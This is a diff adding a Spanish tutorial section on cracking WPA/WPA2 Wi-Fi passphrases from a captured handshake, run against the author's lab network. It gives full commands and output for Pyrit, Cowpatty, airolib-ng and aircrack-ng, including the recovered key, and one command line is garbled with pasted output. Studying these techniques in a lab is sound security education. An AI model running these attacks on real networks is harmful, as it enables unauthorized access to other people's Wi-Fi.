@@ -2324,7 +2324,232 @@ reconstruirse fácilmente los demás valores. Con estas tablas los valores hash 
 pueden ordenarse con sus claves en texto plano.
 
 Un ejemplo claro: https://hashkiller.co.uk/
+
 ### Cracking con Pyrit
+
+Dicho esto y aunque todavía no vamos a meternos del todo con las **Rainbow Tables**, empecemos viendo cómo
+podemos hacer uso de **Pyrit** para crackear contraseñas a través de ataques por diccionario. Primero veremos
+el método convencional y más tarde lo combinaremos con una Rainbow Table.
+
+Una vez capturado un Handshake, podemos hacer uso de Pyrit para crackear la contraseña de la red inalámbrica,
+de la siguiente forma:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #pyrit -e hacklab -i /usr/share/wordlists/rockyou.txt -r Captura-01.cap attack_passthrough
+Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
+https://github.com/JPaulMora/Pyrit
+This code is distributed under the GNU General Public License v3+
+
+Parsing file 'Captura-01.cap' (1/1)...
+Parsed 43 packets (43 802.11-packets), got 1 AP(s)
+
+Picked AccessPoint 20:34:fb:b1:c5:53 automatically...
+```
+
+El modo **attack_passthrough** lo que se encarga es de atacar a un handshake capturado por medio de un ataque
+de fuerza bruta, usando el diccionario especificado a través del parámetro '**-r**'.
+
+Una vez obtenida la contraseña:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #pyrit -e hacklab -i /usr/share/wordlists/rockyou.txt -r Captura-01.cap attack_passthrough
+Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
+https://github.com/JPaulMora/Pyrit
+This code is distributed under the GNU General Public License v3+
+
+Parsing file 'Captura-01.cap' (1/1)...
+Parsed 43 packets (43 802.11-packets), got 1 AP(s)
+
+Picked AccessPoint 20:34:fb:b1:c5:53 automatically...
+Tried 40002 PMKs so far; 2466 PMKs per second. 123hello9
+
+The password is 'hottie4u'.
+```
+
+Si nos fijamos... **2.466 PMKs por segundo**, lo cual es bastante triste considerando la velocidad de
+**aircrack**, pero no nos preocupemos, a pesar de que ahora estamos decepcionados, más adelante nos
+sorprenderá.
+
+### Cracking con Cowpatty
+
+El uso de **Cowpatty** para emplear un ataque de fuerza bruta es el siguiente:
+
+```bash
+┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #cowpatty -f diccionario -r Captura-01.cap -s hacklab
+cowpatty 4.8 - WPA-PSK dictionary attack. <jwright@hasborg.com>
+
+Collected all necessary data to mount crack against WPA2/PSK passphrase.
+Starting dictionary attack.  Please be patient.
+key no. 1000: skittles1
+key no. 2000: princess15
+key no. 3000: unfaithful
+key no. 4000: andresteamo
+key no. 5000: hennessy
+key no. 6000: amigasporsiempre
+key no. 7000: 0123654789
+key no. 8000: trinitron
+key no. 9000: flower22
+key no. 10000: vincenzo
+key no. 11000: pensacola
+key no. 12000: boyracer
+key no. 13000: grandmom
+key no. 14000: battlefield
+key no. 15000: badangel
+
+The PSK is "hottie4u".
+
+15242 passphrases tested in 24.02 seconds:  634.53 passphrases/second
+```
+
+Importante destacar que siempre hay que especificar el **ESSID** de la red. Como vemos, obtenemos la
+contraseña pero el cómputo es incluso mucho menor... **634 contraseñas por segundo**, lo mejoraremos.
+
+### Cracking con Airolib
+
+Ahora, es cuando vamos a ir aumentando la velocidad de cómputo. **Airolib** nos permite crear un diccionario
+de claves pre-computadas (PMK's), lo cual es una maravilla para el caso.
+
+Comenzaremos creando un fichero **passwords-airolib**, indicando el diccionario de contraseñas a usar:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #airolib-ng passwords-airolib --import passwd diccionario 
+Database <passwords-airolib> does not already exist, creating it...
+Database <passwords-airolib> successfully created
+Reading file...
+Writing...s read, 45922 invalid lines ignored.
+Done.
+```
+
+Una vez hecho, creamos un fichero que almacene el **ESSID** de nuestra red y lo sincronizamos con el archivo
+creado:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #echo "hacklab" > essid.lst
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #airolib-ng passwords-airolib --import essid essid.lst 
+Reading file...
+Writing...
+Done.
+```
+
+A través del parámetro '**--stats**', podemos comprobar que está todo correctamente definido:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #airolib-ng passwords-airolib --stats
+There are 1 ESSIDs and 24078 passwords in the database. 0 out of 24078 possible combinations have been computed (0%).
+
+ESSID	Priority	Done
+hacklab	64	0.0
+```
+
+Ya que **airolib** trae un parámetro para limpiar el archivo (líneas no legibles o errores), lo usamos también:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #airolib-ng passwords-airolib --clean all
+Deleting invalid ESSIDs and passwords...
+Deleting unreferenced PMKs...
+Analysing index structure...
+Vacuum-cleaning the database. This could take a while...
+Checking database integrity...
+integrity_check
+ok
+
+Done.
+```
+
+Y ya por último, hacemos uso del parámetro **--batch** para generar el diccionario final de claves precomputadas:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #airolib-ng passwords-airolib --batch
+Batch processing ...
+Computed 5000 PMK in 13 seconds (384 PMK/s, 19078 in buffer)
+Computed 10000 PMK in 24 seconds (416 PMK/s, 14078 in buffer)
+Computed 15000 PMK in 36 seconds (416 PMK/s, 9078 in buffer)
+Computed 20000 PMK in 48 seconds (416 PMK/s, 4078 in buffer)
+Computed 24078 PMK in 58 seconds (415 PMK/s, 0 in buffer)
+All ESSID processed.
+```
+
+Una vez generado, atentos a la velocidad. Vamos a ver con **aircrack** cuánto tardamos haciendo uso del
+procedimiento tradicional:
+
+```bash
+                             Aircrack-ng 1.5.2 
+
+      [00:00:02] 22832/24078 keys tested (9415.01 k/s) 
+
+      Time left: 0 seconds                                      94.83%
+
+                           KEY FOUND! [ hottie4u ]
+
+
+      Master Key     : B1 42 12 E4 D4 86 FF 87 49 04 29 E3 51 E3 C6 BC 
+                       C0 EA A3 03 A6 ED E3 79 A0 A4 BC D6 8F 3B 39 E3 
+
+      Transient Key  : F7 17 BB BB 6F A3 9A E8 D5 DA E6 3E 0E C5 0B 45 
+                       C8 D6 47 4B 87 12 FF A7 80 6A 44 00 05 77 CC 96 
+                       35 99 2D BA 9D B0 A4 CF C2 43 CF 66 2B 74 D9 16 
+                       7C ED 59 EF AE 70 5D 23 D9 7B 9E B9 38 2A 87 CC 
+
+      EAPOL HMAC     : 7F A8 E0 CC 77 49 2C E9 51 8C 81 42 F9 DB CE E0
+```
+
+Valores clave:
+
+* 9.415 contraseñas por segundo
+* 2 segundos hasta dar con la contraseña
+
+Ahora bien, hagamos uso de aircrack para crackear nuevamente la contraseña, pero esta vez con una sintaxis que
+toma como input el fichero creado con **airolib**:
+
+* aircrack-ng -r passwords-airolib Captura-01.cap
+
+Obtenemos los siguientes resultados:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #aircrack-ng -r passwordsAircrack-ng 1.5.2 1.cap
+
+      [00:00:00] 15241/0 keys tested (204456.39 k/s) 
+
+      Time left: 
+
+                           KEY FOUND! [ hottie4u ]
+
+
+      Master Key     : 24 87 02 AB 54 4E 47 C1 C0 DC DE E9 DF 7D 22 88 
+                       80 C4 F0 07 F9 04 B8 71 B7 72 2A F1 04 75 57 99 
+
+      Transient Key  : 21 6C FB DC 6B D0 98 59 99 F1 A3 1A B2 CF 9D 67 
+                       E2 6C DA 3C CC 50 B2 60 9B 65 D3 B1 94 DA B4 AB 
+                       92 62 DB 80 C5 CB DA 15 A5 04 D3 C7 5B A2 FD 8F 
+                       87 36 0A 3A 99 45 14 A2 61 8D 3B 90 44 53 6A A4 
+
+      EAPOL HMAC     : 64 A2 4A 1B D6 22 93 78 78 09 2F 42 7E 11 8F BC 
+```
+
+Valores clave:
+
+* 204.456 contraseñas por segundo
+* 0.X segundos hasta dar con la contraseña
+
+Lo sé, flipante, pero es que se puede ir aún más rápido.
+
+### Rainbow Table con Genpmk
+
+
+
+
+
+
 
 
 
